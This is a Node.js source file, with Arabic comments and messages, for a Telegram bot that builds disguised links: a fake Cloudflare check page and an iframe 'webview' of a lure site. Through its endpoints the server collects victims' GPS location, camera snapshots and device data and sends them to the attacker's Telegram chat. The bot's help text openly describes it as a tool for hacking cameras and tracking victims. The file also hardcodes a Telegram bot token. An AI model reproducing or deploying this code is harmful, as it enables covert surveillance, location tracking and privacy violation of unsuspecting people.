const fs = require("fs");
const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");
const TelegramBot = require("node-telegram-bot-api");

// إعداد البوت بتاع تيليجرام - تم إضافة التوكن هنا
const bot = new TelegramBot("7493699622:AAEq5S8AhN8GOhAH8mVrd8TZRqjMAnjrpHQ", { polling: true });

// إعدادات السيرفر
const app = express();
const PORT = process.env.PORT || 3000;
const hostURL = "https://cbot.onlinoin.repl.co";
const use1pt = true; // TOGGLE for 1pt Proxy and Shorteners

// ... [بقية الكود بدون تغيير] ...

// ميدل وير للبارسينج
app.use(bodyParser.json({ limit: "20mb", type: "application/json" }));
app.use(bodyParser.urlencoded({ extended: true, limit: "20mb", type: "application/x-www-form-urlencoded" }));
app.use(cors());
app.set("view engine", "ejs");

// دالة لجلب الآي بي
function getClientIp(req) {
  return (
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.connection?.remoteAddress ||
    req.ip
  );
}

// دالة لجلب التاريخ بشكل لطيف
function getFormattedDate() {
  return new Date().toISOString().slice(0, 19).replace("T", ":");
}

// مسار عرض WebView
app.get("/w/:path/:uri", (req, res) => {
  const ip = getClientIp(req);
  const time = getFormattedDate();

  if (req.params.path) {
    res.render("webview", {
      ip,
      time,
      url: atob(req.params.uri),
      uid: req.params.path,
      a: hostURL,
      t: use1pt,
    });
  } else {
    res.redirect("https://t.me/onlinehacking");
  }
});

// مسار عرض Cloudflare-style View
app.get("/c/:path/:uri", (req, res) => {
  const ip = getClientIp(req);
  const time = getFormattedDate();

  if (req.params.path) {
    res.render("cloudflare", {
      ip,
      time,
      url: atob(req.params.uri),
      uid: req.params.path,
      a: hostURL,
      t: use1pt,
    });
  } else {
    res.redirect("https://t.me/onlinehacking");
  }
});

// أمر /start
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(
    chatId,
    "⚠️ لإستخدام البوت يجب عليك الانضمام إلى قناتنا على تيليجرام.\n\n⚡️ انضم إلى @OnlineHacking",
    {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "🔗 انضم للقناة",
              url: "https://t.me/OnlineHacking",
            },
          ],
        ],
      },
    }
  );

  // إرسال زر "إنشاء رابط" بعد فترة
  setTimeout(() => {
    bot.sendMessage(
      chatId,
      "📍 اختر من الأزرار التالية:",
      {
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "➕ إنشاء رابط",
                callback_data: "crenew",
              },
            ],
          ],
        },
      }
    );
  }, 1000);
});

// استقبال الرسائل
bot.on("message", (msg) => {
  const chatId = msg.chat.id;
  
  // رسالة الترحيب بعد دقيقتين
  setTimeout(() => {
    bot.sendMessage(
      chatId,
      `مرحباً ${msg.chat.first_name}!\n\nيمكنك استخدام هذا البوت لاختراق الكاميرا من خلال رابط بسيط.\n\nيمكنه جمع معلومات مثل الموقع ومعلومات الجهاز ولقطات الكاميرا.\n\nانضم إلى @OnlineHacking للمزيد من الأدوات.\n\nاكتب /help للمزيد من المعلومات.`
    );
  }, 6000);
  
  // معالجة الردود على الرسائل
  if (msg?.reply_to_message?.text === "🌐 أدخل الرابط الخاص بك") {
    createLink(chatId, msg.text);
  } else if (msg.text === "/create") {
    createNew(chatId);
  } else if (msg.text === "/help") {
    bot.sendMessage(
      chatId,
      `من خلال هذا البوت يمكنك تتبع الأشخاص فقط بإرسال رابط بسيط.\n\nأرسل /create لتبدأ، بعدها سيطلب منك إدخال الرابط الذي سيتم استخدامه لجذب الضحايا.\nبعد استلام الرابط سيتم إرسال رابطين يمكنك استخدامهما لتتبع الأشخاص.\n\nالخيارات المتاحة:\n1. رابط Cloudflare: يعرض صفحة حماية Cloudflare لجمع المعلومات ثم يتم توجيه الضحية للرابط المطلوب.\n2. رابط Webview: يعرض موقعًا (مثل Bing أو مواقع التعارف) باستخدام iframe لجمع المعلومات.\n(⚠️ بعض المواقع قد لا تعمل إذا كانت تحتوي على رأس x-frame مثل https://google.com)\n\nانضم لقناتنا: https://t.me/OnlineHacking`
    );
  }
});

// معالجة الأزرار
bot.on("callback_query", async function onCallbackQuery(query) {
  bot.answerCallbackQuery(query.id);
  if (query.data == "crenew") {
    createNew(query.message.chat.id);
  }
});

// معالجة أخطاء البوت
bot.on("polling_error", (error) => console.error(error));

// إنشاء الروابط
async function createLink(cid, msg) {
  var encoded = [...msg].some((char) => char.charCodeAt(0) > 127);

  if (
    (msg.toLowerCase().includes("http") || msg.toLowerCase().includes("https")) &&
    !encoded
  ) {
    var url = cid.toString(36) + "/" + btoa(msg);
    var m = {
      reply_markup: JSON.stringify({
        inline_keyboard: [[{ text: "إنشاء رابط جديد", callback_data: "crenew" }]],
      }),
    };

    var cUrl = `${hostURL}/c/${url}`;
    var wUrl = `${hostURL}/w/${url}`;

    bot.sendChatAction(cid, "typing");
    
    if (use1pt) {
      try {
        const [x, y] = await Promise.all([
          fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then((res) => res.json()),
          fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then((res) => res.json()),
        ]);

        var f = Object.values(x).join("\n");
        var g = Object.values(y).join("\n");

        bot.sendMessage(
          cid,
          `✅ تم إنشاء الروابط بنجاح!\n\nالرابط المستهدف: ${msg}\n\n💢 انضم لقناتنا @OnlineHacking\n\n🌐 رابط صفحة CloudFlare:\n${f}\n\n🌐 رابط صفحة WebView:\n${g}`,
          m
        );
      } catch (error) {
        console.error(error);
        bot.sendMessage(cid, "⚠️ حدث خطأ أثناء تقصير الروابط، جرب مرة أخرى");
      }
    } else {
      bot.sendMessage(
        cid,
        `✅ تم إنشاء الروابط بنجاح!\n\nالرابط المستهدف: ${msg}\n\n💢 انضم لقناتنا @OnlineHacking\n\n🌐 رابط صفحة CloudFlare:\n${cUrl}\n\n🌐 رابط صفحة WebView:\n${wUrl}`,
        m
      );
    }
  } else {
    bot.sendMessage(cid, "⚠️ الرابط غير صحيح! يجب أن يحتوي على http:// أو https://");
    createNew(cid);
  }
}

// طلب إنشاء رابط جديد
function createNew(cid) {
  var mk = {
    reply_markup: JSON.stringify({ force_reply: true }),
  };
  bot.sendMessage(cid, "🌐 أدخل الرابط الخاص بك", mk);
}

// المسارات الأساسية
app.get("/", (req, res) => {
  var ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.connection?.remoteAddress || req.ip;
  res.json({ ip: ip });
});

app.post("/location", (req, res) => {
  var lat = parseFloat(req.body.lat) || null;
  var lon = parseFloat(req.body.lon) || null;
  var uid = req.body.uid || null;
  var acc = req.body.acc || null;

  if (lat && lon && uid && acc) {
    try {
      const decodedUid = parseInt(uid, 36);
      bot.sendLocation(decodedUid, lat, lon);
      bot.sendMessage(decodedUid, `احداثيات الموقع:\nخط العرض: ${lat}\nخط الطول: ${lon}\nدقة: ${acc} متر`);
      res.send("تم");
    } catch (error) {
      console.error(error);
      res.status(500).send("خطأ");
    }
  } else {
    res.status(400).send("بيانات ناقصة");
  }
});

app.post("/", (req, res) => {
  var uid = req.body.uid || null;
  var data = req.body.data || null;

  if (uid && data) {
    try {
      const decodedData = data.replace(/<br>/g, "\n");
      const decodedUid = parseInt(uid, 36);
      bot.sendMessage(decodedUid, decodedData, { parse_mode: "HTML" });
      res.send("تم");
    } catch (error) {
      console.error(error);
      res.status(500).send("خطأ");
    }
  } else {
    res.status(400).send("بيانات ناقصة");
  }
});

app.post("/camsnap", (req, res) => {
  var uid = req.body.uid || null;
  var img = req.body.img || null;

  if (uid && img) {
    try {
      var buffer = Buffer.from(img, "base64");
      const decodedUid = parseInt(uid, 36);
      bot.sendPhoto(decodedUid, buffer);
      res.send("تم");
    } catch (error) {
      console.error(error);
      res.status(500).send("خطأ");
    }
  } else {
    res.status(400).send("بيانات ناقصة");
  }
});

// تشغيل السيرفر
app.listen(PORT, () => {
  console.log(`🚀 السيرفر يعمل على http://localhost:${PORT}`);
});